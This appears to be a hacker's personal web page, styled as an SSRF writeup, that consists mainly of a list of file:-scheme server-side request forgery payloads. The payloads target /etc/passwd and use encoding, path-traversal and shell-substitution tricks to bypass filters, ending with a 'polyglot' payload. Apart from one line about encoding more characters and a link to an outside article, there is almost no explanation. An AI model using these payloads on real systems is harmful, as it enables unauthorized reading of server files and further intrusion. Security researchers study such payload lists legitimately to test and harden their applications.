<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="psychedelic-styles.css">
  <link rel="stylesheet" href="menu-style.css"> 
  <title>SSRF Writeup - trhacknon's Lab</title>
</head>
<body>
  <div class="container">
    <h1 class="hacker-text">trhacknon - SSRF Writeup</h1>
    <p>Welcome to the Writeup Section!<br><h1> by </h1><h1 class="rainbow-text">trhacknon</h1></p>

    <div class="payloads">
      <h2>Payloads:</h2>
      <ul>
        <li>file:/etc/passwd?/</li>
        <li>file:/etc/passwd%3F/</li>
        <li>file:/etc%252Fpasswd/</li>
        <li>file:/etc%252Fpasswd%3F/</li>
        <li>file:///etc/?/../passwd</li>
        <li>file:///etc/%3F/../passwd</li>
        <li>file:${br}/et${u}c/pas${te}swd?/</li>
        <li>file:$(br)/et$(u)c/pas$(te)swd?/</li>
        <li>file:${br}/et${u}c%252Fpas${te}swd?/</li>
        <li>file:$(br)/et$(u)c%252Fpas$(te)swd?/</li>
        <li>file:${br}/et${u}c%252Fpas${te}swd%3F/</li>
        <li>file:$(br)/et$(u)c%252Fpas$(te)swd%3F/</li>
        <li>file:///etc/passwd?/../passwd</li>
      </ul>
      <p>This last one is the SSRF polyglot for all 3 cases above.</p>
      <p>It’s possible (or needed) to URL encode some other chars like “:”, “.” and “/” which will increase this list a little bit.</p>
      <p>Until next SSRF (Simple Stuff Rodolfo Found) post(s)! ;-)</p>
    </div>

    <div class="message">
      <p>Don’t learn to hack, #hack2learn.</p>
    </div>
    <nav class="navbar">
      <a href="https://rodoassis.medium.com/on-ssrf-server-side-request-forgery-or-simple-stuff-rodolfo-found-part-i-4edf7ee75389" class="tab1">View Writeup</a>
    </nav>
  </div>
</body>
</html>